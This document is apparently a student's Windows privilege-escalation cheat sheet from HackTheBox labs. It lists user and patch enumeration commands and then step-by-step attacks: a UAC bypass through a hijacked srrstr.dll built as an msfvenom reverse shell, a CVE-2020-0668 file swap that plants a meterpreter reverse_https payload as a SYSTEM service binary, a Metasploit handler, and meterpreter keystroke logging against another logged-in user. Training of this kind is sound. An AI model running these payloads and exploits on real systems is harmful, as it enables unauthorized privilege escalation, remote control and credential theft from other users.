# Very Important to enumerate the user first
## User & Group Information
### Logged-In Users
```
C:\htb> query user
```
### Current User
```
C:\htb> echo %USERNAME%
```
### Current User Privileges
```
C:\htb> whoami /priv
```
### Current User Group Information
```
C:\htb> whoami /groups
```
### Get All Users
```
C:\htb> net user
```
### Get All Groups
```
C:\htb> net localgroup
```
### Details About a Group
```
C:\htb> net localgroup administrators
```
### User Account Control
```
net localgroup administrators
```

You are part of the Admin Group Membership but reviewing the user privilges does NOT reveal all the privileges
#### 1.Confirming UAC is Enabled
```
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```
```
EnableLUA 0x1
```
#### 2.Checking UAC Level
```
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
The value of ConsentPromptBehaviorAdmin is 0x5, which means the highest UAC level of Always notify is enabled
#### 3.Checking Windows Version
```
PS C:\htb> [environment]::OSVersion.Version
```
Check the Build Number
```
Visit this page https://github.com/hfiref0x/UACME 
```
and Expand the Keys tab under Usage and look for the build number to determine the target file
**In our example SystemPropertiesAdvanced.exe is the target file, the component (from the website) is srrstr.dll (very important to note this)**
#### 4.Reviewing Path Variable
```
PS C:\htb> cmd /c echo %PATH%
```
We can potentially bypass UAC in this by using DLL hijacking by placing a malicious srrstr.dll DLL to WindowsApps folder, which will be loaded in an elevated context.
#### 5.Generating Malicious srrstr.dll DLL
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```
Transfer the file to C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\ (determined in the echo path command)
#### 6.Executing SystemPropertiesAdvanced.exe on Target Host
```
C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```
#### 7.Starting nc Listener on Attack Host
```
nc -lvnp 8443
```
### Get Password Policy & Other Account Information
```
C:\htb> net accounts
```
## View Detailed Configuration Information
```
C:\htb> systeminfo
```
## Patches and Updates
### cmd
Let's first use WMI to check for missing KBs.
```
C:\htb> wmic qfe
```
#### Vulnerable Services: Enumerating Installed Programs
```
C:\htb> wmic product get name
```
Druva inSync application stands out. A quick Google search shows that version 6.6.3 is vulnerable to a command injection attack via an exposed RPC service. 
If you get Druva inSynce go to notion

```
C:\htb> wmic qfe list brief
```
#### Examining Installed Updates
We can examine the installed updates in several ways. Below are three separate commands we can use.
```
PS C:\htb> systeminfo
```
```
PS C:\htb> wmic qfe list brief
```
```
PS C:\htb> Get-Hotfix
```
CVE-2020-0668 Example for a system that is far behind on security updates 
```
https://github.com/RedCursorSecurityConsulting/CVE-2020-0668
```
1. Building the solution should create the following files
```
CVE-2020-0668.exe
```
```
CVE-2020-0668.exe.config
```
```
CVE-2020-0668.pdb
```
```
NtApiDotNet.dll
```
```
NtApiDotNet.xml
```
We can also look for any third-party software, which can be leveraged, such as the Mozilla Maintenance Service. This service runs in the context of SYSTEM and is startable by unprivileged users. The (non-system protected) binary for this service is located below.
#### 1. Checking Permissions on Binary
```
C:\htb> icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```
icacls confirms that we only have read and execute permissions on this binary based on the line BUILTIN\Users:(I)(RX)
#### 2. Generating Malicious Binary
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
```
OR we could generate a windows/x64/shell_reverse_tcp payload and start a netcat listener instead of metasploit
#### 3. Downloading the Malicious Binary
For this step we need to make two copies of the malicious .exe file. We can just pull it over twice or do it once and make a second copy.
#### 4. Running the Exploit
```
C:\htb> C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```
Checking Permissions of New File
```
C:\htb> icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'
```
`WINLPE-WS02\htb-student:(F)`. This means that our htb-student user has full control over the maintenanceservice.exe binary, and we can overwrite it with a non-corrupted version of our malicious binary.
#### 5. Replacing File with Malicious Binary
```
copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```
`Sign out then back in`
#### 5.1 Metasploit Resource Script (if you generated a payload using metasploit in step two)
```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <our_ip>
set LPORT 8443
exploit
```
Run the `maintenanceservice.exe`
This method did not work with me

### PowerShell 
```
PS C:\htb> Get-HotFix | ft -AutoSize
```
## Installed Programs
### cmd
```
C:\htb> wmic product get name
```
### PowerShell 
```
PS C:\htb> Get-WmiObject -Class Win32_Product |  select Name, Version
```
## Alternate Data Streams
```
https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/
```
â‡’ If we input this command within the windows terminal we could see hidden files
```
dir /R
```
We can use many tools to preview the other hm file like 
```
more < FILE
```
example hm.txt:root.txt:$DATA
```
more <  hm.txt:root.txt:$DATA
```
## qwinsta (docs) will show information about all the active sessions on the box
```
qwinsta
```
```
*Evil-WinRM* PS C:\xampp\htdocs> qwinsta
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console           drbrown                   1  Active
 rdp-tcp                                 65536  Listen
```
The > shows the session the current console is running in, with ID 0. There is another user, drbrown, logged in to an interactive session with ID 1. I got a similar result recently on Reboud and used it with a cross session relay attack to get authenticated as the logged in user. In this case, the logged in user is the same user I am currently authenticated as, just in an interactive session.
1. Get a meterpreter session then use screengrab to determine what the other user is doing
2. If you get an error then migrate your pid to another one using migrate
```
meterpreter > screengrab
```
3. If for example another user is typing credentials then you can use the keyscan_start command to capture the key logs
```
meterpreter > keyscan_start
```
```
Starting the keystroke sniffer ...                                                                                                                 
meterpreter > keyscan_dump                                  
Dumping captured keystrokes...
```